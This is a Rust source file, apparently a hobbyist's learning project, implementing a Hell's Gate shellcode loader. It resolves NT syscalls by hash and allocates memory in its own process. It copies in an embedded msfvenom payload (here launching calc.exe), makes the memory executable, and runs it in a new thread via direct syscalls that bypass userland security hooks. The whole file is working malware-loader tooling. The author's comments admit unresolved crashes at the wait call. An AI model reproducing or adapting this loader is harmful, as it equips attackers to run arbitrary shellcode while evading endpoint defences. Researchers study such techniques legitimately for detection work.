use core::{
    ffi::c_void,
    mem::transmute,
    ptr::{null, null_mut},
};
use hellsgate::{gate::VxTable, hell::*};
// use util::common::vx_move_memory;

pub mod hellsgate;
pub mod util;

// $ msfvenom -a x64 --platform windows -p windows/x64/exec cmd='cmd.exe /c calc.exe' -f rust
const PAYLOAD: [u8; 287] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64, 0x2e, 0x65,
    0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

// pre-computed hashes representing the names of syscalls (hashed with a Jenkins one-at-a-time algorithm)
// should be in the following order:
// "NtClose",
// "NtCreateThreadEx",
// "NtWaitForSingleObject",
// "NtAllocateVirtualMemory",
// "NtProtectVirtualMemory",
// ... but i'm too lazy to check :>
const SYSCALL_HASHED: [u32; 5] = [0x369bd981, 0x8ec0b84a, 0x6299ad3d, 0x6e8ac28e, 0x1da5bb2b];

fn main() {
    let mut status: i32;
    unsafe {
        // retrieves syscall ssn & address from `ntdll.dll`; the syscalls to be retrieved
        // are defined in the above hashes
        let table = VxTable::new(SYSCALL_HASHED.to_vec());
        println!("[+] [FETCHED VXTABLE]:");
        println!("[+] {:#016x?}", table);

        // setup some buffers and re-usabe variables
        let process_handle = (!0) as isize as *mut c_void;              // handle to current process => 0xFFFFFFFFFFFFFFFF
        let mut payload_size = PAYLOAD.len();
        let mut lp_address = null_mut();                                // mutable ptr to receive the base address of the allocation

        // set the syscall's SSN and pass params to assembly function so that args are set in registers and
        // on the stack as per fastcall/microsoft x64 calling conventions before the syscall is actually invoked
        Hell::open(table.nt_allocate_virtual_memory.w_system_call);     // set syscall SSN
        status = Hell::nt_allocate_virtual_memory(                      // setup registers and stack and invoke syscall 
            process_handle,
            &mut lp_address, // will contain the base address of the allocated region when syscall returns
            0u32,
            transmute(&mut payload_size),
            0x1000, // 0x1000 = `MEM_COMMIT`
            0x04,   // 0x4 = `PAGE_READWRITE`
        );

        // check the result of the previous syscall - we kill ourselves if we couldn't execute the
        // syscall correctly
        if status != 0x0 {
            panic!(
                "[x] Panic due to syscall error \n[x] (hash: {:x?}, ssn: {:08x?}) -> {:08x?}",
                table.nt_allocate_virtual_memory.u_hash,
                table.nt_allocate_virtual_memory.w_system_call,
                status
            );
        }

        println!(
            "[+] Copying payload into page allocation '{:#016x?}'",
            &lp_address
        );

        // alternative function `util::common::vx_move_memory` - i THINK it works fine but this
        // achieves the same thing
        std::ptr::copy(
            PAYLOAD.as_ptr() as *const u8,
            lp_address as *mut u8,
            PAYLOAD.len(),
        );
        // vx_move_memory(
        //     lp_address as *mut _,
        //     PAYLOAD.as_ptr() as *const _,
        //     PAYLOAD.len(),
        // );

        println!("[+] Modifying page protections (RW -> RX).\n");

        // this doesn't appear to actually receive anything from the syscall below; maybe because it
        // isn't a null ptr or something but its not super important...
        let mut old_protect = 0x0;

        Hell::open(table.nt_protect_virtual_memory.w_system_call); // set syscall SSN
        status = Hell::nt_protect_virtual_memory(
            // setup registers and stack and invoke syscall
            process_handle,
            &mut lp_address,
            &mut payload_size,
            0x20,
            &mut old_protect,
        );
        if status != 0x0 {
            panic!(
                "[x] Panic due to syscall error \n[x] (hash: {:x?}, ssn: {:08x?}) -> {:08x?}",
                table.nt_allocate_virtual_memory.u_hash,
                table.nt_allocate_virtual_memory.w_system_call,
                status
            );
        }

        println!("[+] Executing shellcode in a new thread.");

        // buffer to receive a handle to the new thread
        let mut h_thread: *mut c_void = null_mut();
        let entry: extern "system" fn(*mut c_void) -> u32 = { transmute(lp_address) };

        Hell::open(table.nt_create_thread_ex.w_system_call);    // set syscall SSN
        status = Hell::nt_create_thread_ex(                     // setup registers and stack and invoke syscall 
            transmute(&mut h_thread),
            0x1FFFFF,
            null(),
            (!0) as isize as *const c_void,
            entry,
            null(),
            0u32,
            0,
            0,
            0,
            null(),
        );
        if status != 0x0 {
            panic!(
                "[x] Panic due to syscall error \n[x] (hash: {:x?}, ssn: {:08x?}) -> {:08x?}",
                table.nt_allocate_virtual_memory.u_hash,
                table.nt_allocate_virtual_memory.w_system_call,
                status
            );
        }

        // i still don't entirely get how references translate into raw pointers but
        // its starting to make a little bit of sense (i think)
        println!(
            "[+] Thread handle '{:#016x?}'",
            &h_thread as *const _ as *const *const u32 // this is just what worked, seems kinda redundant
        );

        // `isize::MIN` = `-9223372036854775808`
        // 3rd param of `NtWaitForSingleObject` is a `PLARGE_INTEGER` struct type but i'm not
        // really sure how it works
        // let timeout: i64 = isize::MIN as i64;

        println!("[+] Waiting...");
        let timeout: i64 = -100000;

        Hell::open(table.nt_wait_for_single_object.w_system_call);          // set syscall SSN
        status = Hell::nt_wait_for_single_object(h_thread, 1, &timeout);    // setup registers and stack and invoke syscall


        // TODO: figure out why 0xC0000005- and 0x00000102-ing
        // rust always crashes at the above syscall with `0xC0000005` or `0x00000102` ('STATUS_ACCESS_VIOLATION'/'STATUS_TIMEOUT')
        // (even when using `windows-rs` userland calls) - these potentially indicate we're doing something wrong with pointers but 
        //i don't know what and i'll figure it out some other time (probably)
        if status != 0x0 {
            panic!(
                "[x] Panic due to syscall error \n[x] (hash: {:x?}, ssn: {:08x?}) -> {:08x?}",
                table.nt_wait_for_single_object.u_hash,
                table.nt_wait_for_single_object.w_system_call,
                status
            );
        }
        println!("[+] Cleaning up thread handle...");

        // you get the idea
        Hell::open(table.nt_close.w_system_call);
        status = Hell::nt_close(h_thread as *const *const c_void);
        if status != 0x0 {
            panic!(
                "[x] Panic due to syscall error \n[x] (hash: {:x?}, ssn: {:08x?}) -> {:08x?}",
                table.nt_close.u_hash, table.nt_close.w_system_call, status,
            );
        }

        println!("[+] Done :))");
    }
}
